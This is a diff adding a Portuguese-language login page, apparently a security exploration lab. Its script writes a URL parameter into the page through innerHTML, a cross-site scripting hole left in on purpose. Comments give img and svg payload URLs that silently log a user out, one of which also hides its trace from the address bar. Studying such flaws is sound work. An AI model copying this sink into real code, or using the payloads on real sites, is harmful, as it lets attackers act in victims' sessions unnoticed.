@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel = "stylesheet" href = "../css/login.css">
+    <title>Login Security Exploration</title>
+    
+    
+
+</head>
+
+<body>
+
+    <div id = "usr-auth">
+
+    <div class="corner tl"></div>
+    <div class="corner tr"></div>
+    <div class="corner bl"></div>
+    <div class="corner br"></div>
+
+    <h1>User Login: </h1>
+    <p class="subtitle">sistema de autenticação v3.0 com BackEnd</p>
+
+        <form id = "usr-auth-form">
+
+        
+        <input type="text" id="usremail-auth" placeholder="Digite o email">
+
+        <input type="text" id="usrpswrd-auth" placeholder="Digite a senha">
+
+        <button id="loginBtn">Login</button>
+
+        </form>
+
+    </div>
+
+    <div id="usrname"></div>
+
+    <script>
+
+        //XSS em URL
+
+    document.addEventListener("DOMContentLoaded", () => {
+
+        console.log("script rodou");
+        
+        const params = new URLSearchParams(window.location.search);
+        const name = params.get("name");
+
+        document.getElementById("usrname").innerHTML = name;
+
+        //aqui pegamos o parametro name da URL e o definimos o conteudo do elemento username como name (estado baseado na URL)
+       
+        //com isso podemos utilizar diversas maneiras para deslogar a sessão de um usuario sem que ele perceba
+
+        //ex de URL de ataque
+        //http://localhost:3000/html/login.html?name=%3Cimg%20src=x%20style=%22display:none%22%20onerror=%22fetch(%27/api/logout%27,{method:%27POST%27})%22%3E
+
+        //SVG
+
+        //?name=<svg onload="fetch('/api/logout',{method:'POST'})">
+
+        //Clean URL
+
+        //?name=<svg onload="fetch('/api/logout',{method:'POST'});history.replaceState(null,'','/html/login.html');">
+    });
+
+    </script>
+
+
+
+    <script type = "module" src = "/js/script.js"></script>
+
+</body>
+
+</html>
